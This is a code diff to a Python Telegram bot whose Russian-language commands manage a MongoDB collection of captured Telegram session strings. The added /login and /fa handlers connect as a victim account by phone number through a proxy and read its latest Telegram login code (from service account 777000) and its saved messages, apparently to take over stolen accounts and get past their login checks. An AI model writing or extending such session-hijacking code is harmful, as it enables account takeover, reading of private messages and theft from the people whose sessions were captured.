@@ -7,9 +7,10 @@ from dotenv import load_dotenv
 from pymongo import MongoClient
 from telethon import TelegramClient
 from telethon.sessions import StringSession
+from telethon.tl.functions.messages import GetHistoryRequest
 from phonenumbers import parse, geocoder
 
-# Load env variables
+# Load env
 load_dotenv()
 
 API_ID = int(os.getenv("API_ID"))
@@ -67,7 +68,6 @@ async def cmd_log(message: types.Message):
         finally:
             await client.disconnect()
 
-    # Отправка результатами по частям
     text = "\n".join(results)
     for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
         await message.answer(chunk)
@@ -125,6 +125,88 @@ async def cmd_validel(message: types.Message):
             await client.disconnect()
 
     await message.answer(f"🧹 Удалено невалидных сессий: {deleted}")
+
+@dp.message_handler(commands=['login'])
+async def cmd_login(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    args = message.get_args().strip()
+    if not args.startswith('+'):
+        await message.reply("❗ Укажи номер телефона в формате: /login +391234567890")
+        return
+
+    session = sessions_col.find_one({"phone": args})
+    if not session:
+        await message.reply("❌ Сессия с этим номером не найдена.")
+        return
+
+    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+    try:
+        await client.connect()
+        history = await client(GetHistoryRequest(
+            peer=777000,
+            limit=1,
+            offset_date=None,
+            offset_id=0,
+            max_id=0,
+            min_id=0,
+            add_offset=0,
+            hash=0
+        ))
+
+        if history.messages:
+            text = history.messages[0].message
+            await message.reply(f"📨 Последний код от Telegram:\n\n`{text}`", parse_mode="Markdown")
+        else:
+            await message.reply("⚠️ Нет сообщений от Telegram (777000).")
+
+    except Exception as e:
+        await message.reply(f"❌ Ошибка: {e}")
+    finally:
+        await client.disconnect()
+
+@dp.message_handler(commands=['fa'])
+async def cmd_fa(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    args = message.get_args().strip()
+    if not args.startswith('+'):
+        await message.reply("❗ Укажи номер телефона в формате: /fa +391234567890")
+        return
+
+    session = sessions_col.find_one({"phone": args})
+    if not session:
+        await message.reply("❌ Сессия с этим номером не найдена.")
+        return
+
+    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+    try:
+        await client.connect()
+        me = await client.get_me()
+        history = await client(GetHistoryRequest(
+            peer=me.id,
+            limit=5,
+            offset_date=None,
+            offset_id=0,
+            max_id=0,
+            min_id=0,
+            add_offset=0,
+            hash=0
+        ))
+
+        if not history.messages:
+            await message.reply("⚠️ Нет исходящих сообщений.")
+            return
+
+        output = "\n\n".join([f"✉️ {msg.message}" for msg in history.messages])
+        await message.reply(f"📤 Последние сообщения:\n\n{output}")
+
+    except Exception as e:
+        await message.reply(f"❌ Ошибка: {e}")
+    finally:
+        await client.disconnect()
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
